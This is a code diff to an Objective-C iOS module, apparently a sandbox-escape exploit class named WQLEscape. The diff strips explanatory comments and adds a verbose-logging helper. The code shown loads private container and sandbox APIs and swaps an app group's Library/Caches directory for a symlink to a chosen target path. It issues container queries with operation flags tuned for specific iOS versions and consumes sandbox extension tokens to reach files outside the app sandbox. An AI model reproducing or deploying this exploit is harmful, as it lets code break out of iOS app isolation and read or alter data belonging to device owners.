@@ -2,6 +2,7 @@
 #import "WQLLog.h"
 #import <dlfcn.h>
 #import <stdlib.h>
+#import <stdarg.h>
 #import <errno.h>
 #import <string.h>
 #import <sys/stat.h>
@@ -38,15 +39,14 @@ static wql_xpc_release_t                 gXPCRelease     = NULL;
 
 static NSString *gPrepareError = nil;
 
-// container_query_operation_set_part(query, 3) = Library/Caches
 static const uint64_t kPartCaches  = 3;
 static const uint64_t kClassAppGrp = 7;
-// 两组已知可用的 operation flags；26.x 与 27 需要的是不同的那一组
 static const uint64_t kFlagDefault = 0x0000008000000000ULL;
 static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
 
 @interface WQLEscape ()
 @property (nonatomic, strong) NSRecursiveLock *lock;
+- (void)vlog:(NSString *)fmt, ...;
 - (uint64_t)preferredFlag;
 - (NSString *)deviceModel;
 - (int64_t)runQueryForGroup:(NSString *)group flags:(uint64_t)flags;
@@ -72,7 +72,6 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
     static dispatch_once_t once;
     static BOOL ok = NO;
     dispatch_once(&once, ^{
-        // 1. libcontainer C API（不同版本库名不同，两个都试）
         const char *containerLibs[] = {
             "/usr/lib/system/libsystem_containermanager.dylib",
             "/usr/lib/system/libsystem_container.dylib",
@@ -82,11 +81,8 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
         for (int i = 0; containerLibs[i] && !cl; i++) {
             void *h = dlopen(containerLibs[i], RTLD_NOW | RTLD_LOCAL);
             if (!h) continue;
-            if (dlsym(h, "container_query_create")) {
-                cl = h;
-            } else {
-                dlclose(h);
-            }
+            if (dlsym(h, "container_query_create")) cl = h;
+            else dlclose(h);
         }
         if (cl) {
             gQueryCreate    = (wql_query_create_t)dlsym(cl, "container_query_create");
@@ -99,7 +95,6 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
             gCopyToken      = (wql_copy_sandbox_token_t)dlsym(cl, "container_copy_sandbox_token");
         }
 
-        // 2. libsandbox
         const char *sbxLibs[] = {
             "/usr/lib/system/libsystem_sandbox.dylib",
             "/usr/lib/libsandbox.1.dylib",
@@ -110,14 +105,10 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
             void *h = dlopen(sbxLibs[i], RTLD_NOW | RTLD_LOCAL);
             if (!h) continue;
             gConsume = (wql_sbx_consume_t)dlsym(h, "sandbox_extension_consume");
-            if (gConsume) {
-                gRelease = (wql_sbx_release_t)dlsym(h, "sandbox_extension_release");
-            } else {
-                dlclose(h);
-            }
+            if (gConsume) gRelease = (wql_sbx_release_t)dlsym(h, "sandbox_extension_release");
+            else dlclose(h);
         }
 
-        // 3. libxpc（只用来造 group identifier 对象）
         void *xl = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW | RTLD_LOCAL);
         void *xh = xl ? xl : RTLD_DEFAULT;
         gXPCString  = (wql_xpc_string_create_t)dlsym(xh, "xpc_string_create");
@@ -182,8 +173,16 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
     };
 }
 
+- (void)vlog:(NSString *)fmt, ... {
+    if (!self.verboseLogging) return;
+    va_list args;
+    va_start(args, fmt);
+    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
+    va_end(args);
+    WQLLogLine(@"%@", line);
+}
+
 - (uint64_t)preferredFlag {
-    // 26.x 用 0x800000000；27 用 0x8000000000。猜错会直接 -5，下面会自动换另一组重试。
     NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
     return (v.majorVersion == 26) ? kFlagAlt : kFlagDefault;
 }
@@ -211,12 +210,11 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
     }
     if (![self prepareWithError:error]) return WQLStatusSymbolsMissing;
 
-    // 目标必须存在（区分“不存在”和“没权限”，否则日志会误导）
     struct stat st;
     errno = 0;
     if (lstat(path.fileSystemRepresentation, &st) != 0) {
         int e = errno;
-        WQLLogLine(@"escape: lstat 失败 %@ errno=%d(%s)", path, e, strerror(e));
+        [self vlog:@"escape: lstat 失败 %@ errno=%d(%s)", path, e, strerror(e)];
         if (error) {
             *error = [NSString stringWithFormat:@"lstat 失败 errno=%d(%s): %@",
                       e, strerror(e), path];
@@ -241,10 +239,8 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
         return WQLStatusNoGroup;
     }
     NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
-    WQLLogLine(@"escape: target=%@ group=%@ groupRoot=%@",
-               target, group, root.path);
+    [self vlog:@"escape: target=%@ group=%@ groupRoot=%@", target, group, root.path];
 
-    // 符号链接替换是全局状态，必须串行
     [self.lock lock];
 
     NSError *symErr = nil;
@@ -260,19 +256,17 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
     uint64_t second = (first == kFlagAlt) ? kFlagDefault : kFlagAlt;
 
     int64_t handle = [self runQueryForGroup:group flags:first];
-    WQLLogLine(@"escape: flags=0x%llx → %lld",
-               (unsigned long long)first, (long long)handle);
+    [self vlog:@"escape: flags=0x%llx → %lld", (unsigned long long)first, (long long)handle];
     if (handle == WQLStatusQueryRejected || handle == WQLStatusTokenRefused) {
         int64_t retry = [self runQueryForGroup:group flags:second];
-        WQLLogLine(@"escape: flags=0x%llx → %lld",
-                   (unsigned long long)second, (long long)retry);
+        [self vlog:@"escape: flags=0x%llx → %lld", (unsigned long long)second, (long long)retry];
         if (retry > 0) handle = retry;
     }
 
     [self restoreCaches:caches];
     [self.lock unlock];
 
-    WQLLogLine(@"escape: 结果 %@ (target=%@)", [self describeStatus:handle], target);
+    [self vlog:@"escape: 结果 %@ (target=%@)", [self describeStatus:handle], target];
 
     if (handle < 0 && error) {
         *error = [NSString stringWithFormat:@"%@ (target=%@)", [self describeStatus:handle], target];
@@ -286,7 +280,6 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
 
     gQuerySetClass(q, kClassAppGrp);
 
-    // worse_query 原版直接传 xpc_string，不是 xpc_array —— 按原样来
     void *ident = gXPCString ? gXPCString(group.UTF8String) : NULL;
     if (ident) gQuerySetGroups(q, ident);
 
@@ -312,8 +305,6 @@ static const uint64_t kFlagAlt     = 0x0000000800000000ULL;
 }
 
 - (BOOL)swapCachesAtPath:(NSString *)caches toSymlink:(NSString *)target error:(NSError **)error {
-    // 与作者原版一致：先删掉真实目录，再在原位置建符号链接。
-    // 不用 replaceItemAtURL：它对符号链接的处理在 iOS 上没有可靠保证。
     NSFileManager *fm = [NSFileManager defaultManager];
     [fm removeItemAtPath:caches error:nil];
     return [fm createSymbolicLinkAtPath:caches withDestinationPath:target error:error];
